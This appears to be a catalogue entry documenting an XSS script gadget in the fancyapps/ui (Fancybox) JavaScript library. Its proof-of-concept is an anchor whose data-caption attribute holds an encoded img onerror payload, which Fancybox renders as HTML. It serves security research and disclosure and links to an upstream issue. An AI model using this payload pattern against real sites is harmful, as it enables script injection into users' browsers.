---
description: Modern and feature-rich JavaScript toolkit.
github: fancyapps/ui
gadgets:
  Latest:
    authors:
      - github:hrtode99
    tags:
      - any-tag
      - data-attr
      - any-timing
      - chrome-browser
      - firefox-browser
      - safari-browser
    pocs:
      - description: The fancybox component uses HTML from the `data-caption` attribute.
        code: |
          <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1/dist/fancybox/fancybox.css" />
          <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1/dist/fancybox/fancybox.umd.js"></script>
          <a data-fancybox data-caption="&lt;img src=x onerror=&quot;alert()&quot;&gt;" href="https://example.com/">Click me</a>
          <script>Fancybox.bind("[data-fancybox]", {});</script>
    links:
      - https://github.com/fancyapps/ui/issues/826
---
